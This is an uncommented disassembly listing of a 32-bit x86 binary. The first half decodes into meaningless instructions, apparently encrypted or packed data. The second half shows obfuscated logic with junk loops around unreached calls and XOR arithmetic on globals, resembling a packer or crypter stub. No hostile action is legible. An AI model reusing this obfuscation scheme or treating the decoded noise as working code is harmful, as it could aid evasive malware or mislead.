  41602b:	shl    BYTE PTR [ebp-0x7c],1
  41602e:	scas   eax,DWORD PTR es:[edi]
  41602f:	mov    ebx,0xb580443e
  416034:	push   ecx
  416035:	mov    ebp,0x907dd8f
  41603a:	out    0x59,al
  41603c:	fisub  DWORD PTR [ebp-0x74]
  41603f:	xchg   ebp,eax
  416040:	jl     0x415fe2
  416042:	and    al,0x89
  416044:	mov    dh,0xb3
  416046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416047:	add    bh,BYTE PTR [ebx-0x1e]
  41604a:	shr    DWORD PTR [esp+ebx*2-0x55],0x18
  41604f:	stc    
  416050:	out    0xf9,eax
  416052:	jg     0x415fda
  416054:	mov    esp,0x7471c916
  416059:	test   al,0x66
  41605b:	sub    BYTE PTR [esi],bh
  41605d:	into   
  41605e:	jb     0x416061
  416060:	inc    esp
  416061:	xchg   ebx,eax
  416062:	addr16 or al,0xb6
  416065:	pop    edi
  416066:	lock push ebx
  416068:	adc    al,0xee
  41606a:	shr    DWORD PTR [ebx+0xa],cl
  41606d:	retf   
  41606e:	stos   DWORD PTR es:[edi],eax
  41606f:	pop    esp
  416070:	pusha  
  416071:	aam    0xe2
  416073:	jns    0x4160a1
  416075:	dec    edi
  416076:	xchg   esi,eax
  416077:	dec    esi
  416078:	sti    
  416079:	xor    DWORD PTR [edi],0x7eae68fd
  41607f:	xchg   edx,eax
  416080:	call   0x145b:0x5eeac0bb
  416087:	lea    eax,[edx+ebx*8]
  41608a:	fmul   st,st(5)
  41608c:	outs   dx,BYTE PTR ds:[esi]
  41608d:	nop
  41608e:	ficomp WORD PTR [ebp-0x10]
  416091:	(bad)  
  416092:	cmp    BYTE PTR [edi-0xa],bl
  416095:	xor    eax,esp
  416097:	fwait
  416098:	and    dl,dh
  41609a:	popf   
  41609b:	push   0xffffffd0
  41609d:	pop    ds
  41609e:	push   ecx
  41609f:	pop    edi
  4160a0:	lds    esi,FWORD PTR ds:0x25097330
  4160a6:	pop    ss
  4160a7:	(bad)  
  4160a8:	mov    al,0x84
  4160aa:	cld    
  4160ab:	sub    bh,BYTE PTR [ebx]
  4160ad:	sub    edi,edx
  4160af:	stos   BYTE PTR es:[edi],al
  4160b0:	mov    ds:0xb954b2a9,eax
  4160b5:	shr    BYTE PTR [ecx-0x26],0x3a
  4160b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160ba:	xor    DWORD PTR [eax+0x52],ebp
  4160bd:	cdq    
  4160be:	mov    ebp,0x816aec6e
  4160c3:	or     cl,BYTE PTR [ecx-0x50]
  4160c6:	inc    ebx
  4160c7:	dec    ecx
  4160c8:	xchg   esp,esi
  4160ca:	add    al,0x1a
  4160cc:	push   esi
  4160cd:	jge    0x4160f4
  4160cf:	pop    ds
  4160d0:	aas    
  4160d1:	call   FWORD PTR [edx-0x45]
  4160d4:	clc    
  4160d5:	jne    0x4160c7
  4160d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d8:	fmul   st,st(4)
  4160da:	xchg   edx,eax
  4160db:	dec    esp
  4160dc:	jmp    0x4160e8
  4160de:	adc    bl,BYTE PTR [ebx-0x13]
  4160e1:	cdq    
  4160e2:	retf   
  4160e3:	pop    es
  4160e4:	int3   
  4160e5:	inc    esp
  4160e6:	xor    esp,DWORD PTR [ebp+0x54]
  4160e9:	push   edi
  4160ea:	xchg   ebx,eax
  4160eb:	aas    
  4160ec:	mov    eax,ds:0x9179b26b
  4160f1:	jecxz  0x41609f
  4160f3:	psubd  mm4,QWORD PTR [esp+esi*4]
  4160f7:	js     0x4160ae
  4160f9:	cwde   
  4160fa:	les    ecx,FWORD PTR [ebp-0x3302fbe9]
  416100:	int3   
  416101:	mov    dh,0x97
  416103:	fadd   DWORD PTR [edx+ebx*2]
  416106:	(bad)  
  416107:	jp     0x416090
  416109:	and    BYTE PTR ds:0x670823bb,dl
  41610f:	call   FWORD PTR [ebx-0x1cc9b7b0]
  416115:	stc    
  416116:	fst    DWORD PTR [esi]
  416118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416119:	pop    edx
  41611a:	mul    BYTE PTR [edi+eiz*1-0x79]
  41611e:	and    DWORD PTR [eax-0x5f07133b],ecx
  416124:	clc    
  416125:	js     0x416156
  416127:	(bad)  
  416128:	pop    eax
  416129:	xchg   edx,eax
  41612a:	dec    ebp
  41612b:	mov    edx,DWORD PTR [ebx+0x5c6c30d7]
  416131:	and    eax,0x203558a0
  416136:	push   ebp
  416137:	or     ch,BYTE PTR ds:0xf5dbdf32
  41613d:	pop    edx
  41613e:	jl     0x416117
  416140:	adc    BYTE PTR [edx+0x62],ah
  416143:	daa    
  416144:	xor    eax,0xa13aa62
  416149:	mov    al,ds:0xc35543c5
  41614e:	add    BYTE PTR [edx+0x37],dh
  416151:	and    ah,BYTE PTR [ecx]
  416153:	adc    edx,DWORD PTR [edx+0x277ec252]
  416159:	stc    
  41615a:	dec    esp
  41615b:	xchg   edi,eax
  41615c:	mov    esp,0xabf584a2
  416161:	jmp    0x76e1ba32
  416166:	jmp    0x4161be
  416168:	cli    
  416169:	cmp    eax,0x70417a09
  41616e:	rcl    ebx,cl
  416170:	mov    ecx,0xd1a8a809
  416175:	(bad)  
  416176:	sub    al,BYTE PTR [ebx]
  416178:	xchg   ah,dh
  41617a:	shr    BYTE PTR [edx-0x19],1
  41617d:	push   0x834796
  416182:	adc    DWORD PTR [esi+0x5af852f5],ebx
  416188:	jmp    0x736:0xc64cab91
  41618f:	sub    al,0xec
  416191:	push   edi
  416192:	mov    dh,0x6c
  416194:	xor    eax,0xaad963d9
  416199:	cs mov dl,0x9d
  41619c:	sbb    eax,0xf564dd2c
  4161a1:	push   ecx
  4161a2:	adc    DWORD PTR [edi],eax
  4161a4:	sub    esi,DWORD PTR [esi-0x6802a66c]
  4161aa:	mov    edx,0x588dfa54
  4161af:	mov    edi,0x5a85f385
  4161b4:	std    
  4161b5:	lods   al,BYTE PTR ds:[esi]
  4161b6:	mov    ah,0x34
  4161b8:	leave  
  4161b9:	test   BYTE PTR [edi-0x34],cl
  4161bc:	data16 cmp al,0x35
  4161bf:	mov    eax,0x7f7d4e97
  4161c4:	adc    DWORD PTR [ebp+eax*4+0x48],edx
  4161c8:	sub    DWORD PTR [ecx-0x7e],esi
  4161cb:	popf   
  4161cc:	push   cs
  4161cd:	and    eax,0x69a403d
  4161d2:	cmp    ebx,DWORD PTR [eax-0x1be8c511]
  4161d8:	and    esi,0x75c4a95c
  4161de:	jnp    0x4161b6
  4161e0:	popf   
  4161e1:	and    BYTE PTR [eax],cl
  4161e3:	or     eax,0x6a68de37
  4161e8:	push   esi
  4161e9:	imul   edi,DWORD PTR [edi+0x66],0x406228b5
  4161f0:	je     0x4161dd
  4161f2:	push   eax
  4161f3:	jae    0x41623e
  4161f5:	bound  edi,QWORD PTR ds:0x5c1f5f63
  4161fb:	out    0xf9,eax
  4161fd:	xor    al,0xd1
  4161ff:	xchg   esp,eax
  416200:	adc    eax,0x23566136
  416205:	jbe    0x41622f
  416207:	dec    esi
  416208:	inc    ecx
  416209:	and    esp,DWORD PTR [edx+ebp*8+0x5]
  41620d:	mov    eax,0xe1234916
  416212:	add    dl,bh
  416214:	and    al,0xfa
  416216:	and    eax,0xc533b14b
  41621b:	bound  esp,QWORD PTR [edi+0x59]
  41621e:	mov    ds:0x70e98774,al
  416223:	scas   eax,DWORD PTR es:[edi]
  416224:	pop    edx
  416225:	dec    esp
  416226:	(bad)  [ebx+0x23a53ba3]
  41622c:	add    ebp,DWORD PTR [esi-0x40]
  41622f:	repnz adc dh,BYTE PTR [ecx+ebx*2-0x29510e36]
  416237:	enter  0x126a,0xa7
  41623b:	mov    dh,0x7
  41623d:	enter  0xa7eb,0xf9
  416241:	push   0x4e0643b4
  416246:	jbe    0x416296
  416248:	into   
  416249:	xchg   edx,eax
  41624a:	shr    DWORD PTR [edi+0x790ea387],1
  416250:	lea    eax,[ebp+0x21]
  416253:	jae    0x4162a9
  416255:	sti    
  416256:	rol    DWORD PTR [edi],1
  416258:	cdq    
  416259:	pop    ss
  41625a:	(bad)  
  41625b:	scas   eax,DWORD PTR es:[edi]
  41625c:	xor    DWORD PTR [eax+0x217bac36],ecx
  416262:	adc    ch,BYTE PTR [edx+eax*1-0x3]
  416266:	cmp    cl,BYTE PTR [edi-0x44]
  416269:	xor    al,0x47
  41626b:	stc    
  41626c:	adc    eax,0x6166dc55
  416271:	ss push esi
  416273:	jbe    0x416297
  416275:	inc    edi
  416276:	mov    ds:0x8bc06343,eax
  41627b:	test   eax,0xc727dd9c
  416280:	test   edx,esi
  416282:	xchg   esp,eax
  416283:	call   0xb43489bd
  416288:	push   edx
  416289:	outs   dx,BYTE PTR ds:[esi]
  41628a:	adc    bh,al
  41628c:	push   esi
  41628d:	cdq    
  41628e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41628f:	jno    0x416277
  416291:	mov    edi,0xc1280951
  416296:	sub    eax,0x5bf63213
  41629b:	sub    DWORD PTR [esi],edx
  41629d:	or     bl,BYTE PTR [ecx-0x7aa5e3f7]
  4162a3:	pushf  
  4162a4:	lahf   
  4162a5:	call   DWORD PTR [ecx]
  4162a7:	push   cs
  4162a8:	mov    ebx,0xcf0a29eb
  4162ad:	fst    QWORD PTR ds:0x1a807f7a
  4162b3:	pushf  
  4162b4:	bound  ebx,QWORD PTR [eax+0x59ac2da7]
  4162ba:	and    BYTE PTR [edi-0x22],dh
  4162bd:	repz mov edi,0x540f9263
  4162c3:	in     eax,0x71
  4162c5:	(bad)  
  4162c7:	test   BYTE PTR [edi+0x460e3834],bh
  4162cd:	in     al,0x66
  4162cf:	(bad)  
  4162d0:	add    bh,BYTE PTR [ebp+0x552c37a1]
  4162d6:	fnstsw WORD PTR [edi-0x1df52105]
  4162dc:	int3   
  4162dd:	sub    ah,BYTE PTR [esi-0x37]
  4162e0:	xor    BYTE PTR [ecx+0x1a],0x5c
  4162e4:	xor    al,0xc2
  4162e6:	jle    0x416288
  4162e8:	mov    esp,0x2d78f535
  4162ed:	or     eax,0x27714561
  4162f2:	adc    al,0xd0
  4162f4:	xchg   esi,eax
  4162f5:	add    esp,ebx
  4162f7:	out    dx,al
  4162f8:	scas   al,BYTE PTR es:[edi]
  4162f9:	into   
  4162fa:	out    0x51,al
  4162fc:	in     eax,0x27
  4162fe:	jg     0x4162a1
  416300:	sbb    BYTE PTR [ebx],al
  416302:	lea    eax,[ebx]
  416304:	sbb    al,0xd5
  416306:	stc    
  416307:	stos   BYTE PTR es:[edi],al
  416308:	push   es
  416309:	test   BYTE PTR [edi-0x6514559b],al
  41630f:	inc    edx
  416310:	xlat   BYTE PTR ds:[ebx]
  416311:	sbb    eax,0xd2aa9181
  416316:	call   edi
  416318:	lea    ebp,[edx-0x72d36961]
  41631e:	mov    bl,0x21
  416320:	jmp    0x4162df
  416322:	fist   DWORD PTR [edx+0x201894f7]
  416328:	pop    edi
  416329:	sahf   
  41632a:	dec    eax
  41632b:	jae    0x416308
  41632d:	popa   
  41632e:	rcl    BYTE PTR ds:0x7e5a68cc,cl
  416334:	leave  
  416335:	dec    eax
  416336:	call   DWORD PTR [eax-0x6c]
  416339:	(bad)  
  41633a:	push   ss
  41633b:	stos   BYTE PTR es:[edi],al
  41633c:	or     eax,0xe2b0b648
  416341:	iret   
  416342:	aam    0x7e
  416344:	daa    
  416345:	xchg   esi,eax
  416346:	and    DWORD PTR [eax+esi*4-0x318995dc],edi
  41634d:	aam    0x89
  41634f:	xchg   esp,eax
  416350:	jmp    0x92543c6b
  416355:	mov    BYTE PTR [eax-0x7f],al
  416358:	rcl    ah,1
  41635a:	scas   eax,DWORD PTR es:[edi]
  41635b:	data16 std 
  41635d:	xlat   BYTE PTR ds:[ebx]
  41635e:	push   0xffffffd2
  416360:	xchg   DWORD PTR [eax-0x7670c720],ecx
  416366:	push   es
  416367:	mov    WORD PTR [esi],ss
  416369:	int3   
  41636a:	adc    BYTE PTR [edx+0x3fe0990d],al
  416370:	inc    ebp
  416371:	add    eax,0xbe7e9659
  416376:	sub    DWORD PTR [ecx],esp
  416378:	and    BYTE PTR [ecx+0x78321a4f],ch
  41637e:	inc    ebp
  41637f:	jb     0x4163fe
  416381:	ins    BYTE PTR es:[edi],dx
  416382:	sub    bl,BYTE PTR [eax+0x31]
  416385:	or     ebp,edi
  416387:	inc    edx
  416388:	pop    es
  416389:	cld    
  41638a:	cmp    eax,0x66f7e74e
  41638f:	punpckhbw mm5,QWORD PTR [ecx+eiz*1]
  416393:	loopne 0x416412
  416395:	sub    BYTE PTR [eax-0x72b75ee1],ah
  41639b:	lods   eax,DWORD PTR ds:[esi]
  41639c:	pop    ebx
  41639d:	mov    dl,0x88
  41639f:	jb     0x41638a
  4163a1:	lods   al,BYTE PTR ds:[esi]
  4163a2:	lods   eax,DWORD PTR ds:[esi]
  4163a3:	sahf   
  4163a4:	mov    cl,0x8c
  4163a6:	pusha  
  4163a7:	mov    cl,0xcd
  4163a9:	sbb    eax,0xb5d69c84
  4163ae:	inc    edi
  4163af:	mov    cl,0x36
  4163b1:	xchg   esp,eax
  4163b2:	ror    DWORD PTR [esp+edi*8+0x2165c79d],cl
  4163b9:	sbb    cl,ch
  4163bb:	lea    ebp,[esi-0x6c]
  4163be:	loope  0x416432
  4163c0:	add    al,0xb0
  4163c2:	hlt    
  4163c3:	je     0x4163ef
  4163c5:	mov    eax,ds:0xb64ad0bc
  4163ca:	push   ecx
  4163cb:	jmp    0x6158a505
  4163d0:	add    ah,dl
  4163d2:	sbb    cl,BYTE PTR [eax+0x6105a2bd]
  4163d8:	push   ecx
  4163d9:	mov    edi,edx
  4163db:	jbe    0x4163cb
  4163dd:	pushf  
  4163de:	inc    edi
  4163df:	stc    
  4163e0:	add    esi,DWORD PTR [ecx+ebp*1]
  4163e3:	xor    BYTE PTR [edi+0x3b],ah
  4163e6:	pop    ds
  4163e7:	xor    DWORD PTR [ebx+0x2f],eax
  4163ea:	in     al,0xe1
  4163ec:	mov    bl,0xdc
  4163ee:	out    dx,eax
  4163ef:	or     eax,0x46908c6
  4163f4:	imul   edi,ebp,0x165b0ca1
  4163fa:	mov    edx,0x2b2d1372
  4163ff:	es mov esi,0xa59f7a
  416405:	fimul  DWORD PTR [esi-0x78]
  416408:	sub    eax,0xc781a2cc
  41640d:	sar    DWORD PTR [eax+0x263329c],cl
  416413:	cmp    eax,DWORD PTR cs:[esi+0x0]
  416417:	cs jle 0x4163d2
  41641a:	push   ebx
  41641b:	and    ch,BYTE PTR [edi]
  41641d:	nop
  41641e:	cmp    BYTE PTR [esi-0x7c],bl
  416421:	retf   
  416422:	or     ah,bl
  416424:	stc    
  416425:	dec    ebp
  416426:	les    edi,FWORD PTR [ebx]
  416428:	call   0xcda2:0xbb876323
  41642f:	ds inc edx
  416431:	ret    
  416432:	cld    
  416433:	jo     0x416441
  416435:	jecxz  0x4163f1
  416437:	ficom  WORD PTR [ebx+0xf66ae67]
  41643d:	mov    dl,0xed
  41643f:	mov    ?,WORD PTR [esi+0x28]
  416442:	adc    bh,cl
  416444:	(bad)  
  416445:	pop    ebx
  416446:	push   edi
  416447:	cdq    
  416448:	xor    edx,ebp
  41644a:	(bad)  
  41644b:	sar    DWORD PTR [ebx],cl
  41644d:	rol    BYTE PTR [bp+si+0x6536],cl
  416452:	inc    ecx
  416453:	jne    0x416413
  416455:	mov    bl,0xbd
  416457:	inc    esi
  416458:	jg     0x41644b
  41645a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41645b:	dec    ebx
  41645c:	pop    esp
  41645d:	inc    esp
  41645e:	push   edi
  41645f:	in     al,dx
  416460:	inc    edi
  416461:	xor    al,0x59
  416463:	xchg   ecx,eax
  416464:	cmc    
  416465:	jne    0x416448
  416467:	mov    bl,0x14
  416469:	ret    
  41646a:	aaa    
  41646b:	cs (bad) 
  41646e:	dec    esi
  41646f:	std    
  416470:	imul   esi,ecx,0x3c
  416473:	jo     0x4164eb
  416475:	adc    al,0xa5
  416477:	popf   
  416478:	fwait
  416479:	daa    
  41647a:	add    al,0xff
  41647c:	mov    ebx,0xcdea7465
  416481:	pop    edx
  416482:	adc    ebx,DWORD PTR [eax-0x4e3363cb]
  416488:	stc    
  416489:	cmp    eax,0x6ceb2c1c
  41648e:	loopne 0x4164c5
  416490:	inc    ebp
  416491:	aad    0xb5
  416493:	pusha  
  416494:	aaa    
  416495:	xchg   edx,eax
  416496:	inc    esp
  416497:	rcr    ebp,1
  416499:	mov    ebp,0x27675205
  41649e:	cs cs je 0x4164b3
  4164a2:	out    dx,eax
  4164a3:	and    al,0xd
  4164a5:	out    dx,eax
  4164a6:	xchg   BYTE PTR [ecx+0x79],al
  4164a9:	cmp    BYTE PTR [ecx-0x3c],cl
  4164ac:	dec    esi
  4164ad:	cdq    
  4164ae:	mov    edi,0x5124d540
  4164b3:	into   
  4164b4:	dec    edi
  4164b5:	enter  0x2f2d,0xa1
  4164b9:	inc    ebp
  4164ba:	mov    dl,0xc3
  4164bc:	and    edx,edx
  4164be:	cli    
  4164bf:	jge    0x41649d
  4164c1:	dec    eax
  4164c2:	xchg   edi,eax
  4164c3:	mov    esi,0xe39c9601
  4164c8:	xchg   BYTE PTR [esi+0x30],cl
  4164cb:	cmp    dl,bh
  4164cd:	mov    bl,0x91
  4164cf:	fistp  WORD PTR ds:0x11bfe869
  4164d5:	das    
  4164d6:	inc    edi
  4164d7:	popa   
  4164d8:	and    edx,DWORD PTR [ebx]
  4164da:	xor    DWORD PTR [ebx+0x7da5a0f6],esi
  4164e0:	nop
  4164e1:	into   
  4164e2:	rcr    BYTE PTR [eax],0x6c
  4164e5:	leave  
  4164e6:	jmp    0x41652e
  4164e8:	leave  
  4164e9:	sub    eax,0x8f3654d0
  4164ee:	mov    ds:0xc2fc11d5,al
  4164f3:	fisttp QWORD PTR [eax]
  4164f5:	pop    DWORD PTR [edx]
  4164f7:	or     al,0x23
  4164f9:	sbb    esi,ebx
  4164fb:	ficomp WORD PTR [ebx+0x3d180d6f]
  416501:	sti    
  416502:	and    BYTE PTR [edi],cl
  416504:	(bad)  
  416505:	out    dx,eax
  416506:	ja     0x416553
  416508:	les    esi,FWORD PTR [eax]
  41650a:	cli    
  41650b:	loope  0x416588
  41650d:	sbb    BYTE PTR [eax],al
  41650f:	test   al,0x7b
  416511:	in     eax,dx
  416512:	aad    0xa
  416514:	outs   dx,DWORD PTR ds:[esi]
  416515:	out    dx,eax
  416516:	pop    esp
  416517:	and    ebx,DWORD PTR [esi]
  416519:	pop    ecx
  41651a:	jge    0x416597
  41651c:	push   cs
  41651d:	(bad)  
  41651e:	fist   DWORD PTR [ecx]
  416520:	xor    DWORD PTR [ecx],ebp
  416522:	fwait
  416523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416525:	inc    ebp
  416526:	sbb    eax,0x769b46aa
  41652b:	sub    ebx,DWORD PTR [ebx+0x3258d112]
  416531:	es xchg ebp,eax
  416533:	popa   
  416534:	retf   
  416535:	lods   eax,DWORD PTR ds:[esi]
  416536:	in     al,0x88
  416538:	ss das 
  41653a:	pop    ebp
  41653b:	add    esp,DWORD PTR [esp+eiz*8+0x32]
  41653f:	test   DWORD PTR es:[eax-0x21],esi
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42a9e3
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42a9e7
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42a9eb
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42a9ef
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42a9bb
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42976f
  416825:	mov    ebx,DWORD PTR ds:0x429bef
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42a9bf
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42a9c3
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42a9cb
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
